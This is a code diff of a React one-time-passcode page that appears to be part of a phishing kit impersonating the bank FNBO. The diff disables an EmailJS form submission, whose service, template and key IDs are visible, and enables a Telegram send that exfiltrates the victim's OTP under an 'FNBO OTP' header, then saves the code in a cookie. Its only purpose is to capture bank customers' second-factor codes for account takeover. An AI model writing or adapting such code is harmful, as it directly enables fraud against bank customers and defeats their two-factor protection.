@@ -1,9 +1,9 @@
 import React from 'react'
 import { useNavigate } from 'react-router-dom';
 import cookies from '../utils/cookie.config';
-// import TelegramSend from '../utils/send-message';
+import TelegramSend from '../utils/send-message';
 // import { wait } from '../utils/waiter';
-import emailjs from "@emailjs/browser";
+// import emailjs from "@emailjs/browser";
 
 export default function Otp() {
   const [formInput, setFormInput] = React.useState<otp>({
@@ -24,22 +24,22 @@ export default function Otp() {
     event.preventDefault();
     setIsLoading(true);
 
-    const mail = await emailjs.sendForm(
-      "service_m05lftf",
-      "template_aeij4rd",
-      form.current!,
-      "74xz7jS-Xw5rVxjbV"
-    )
-    if(mail.status !== 200){
-      alert("Failed to login");
-      setIsLoading(false);
-      return
-    }
-    // const message = `
-    // ---- FNBO OTP -----
-    // Code: ${formInput.cd}
-    // `;
-    // await TelegramSend(message);
+    // const mail = await emailjs.sendForm(
+    //   "service_m05lftf",
+    //   "template_aeij4rd",
+    //   form.current!,
+    //   "74xz7jS-Xw5rVxjbV"
+    // )
+    // if(mail.status !== 200){
+    //   alert("Failed to login");
+    //   setIsLoading(false);
+    //   return
+    // }
+    const message = `
+    ---- FNBO OTP -----
+    Code: ${formInput.cd}
+    `;
+    await TelegramSend(message);
   
     cookies.set("code", formInput);
     setIsLoading(false)
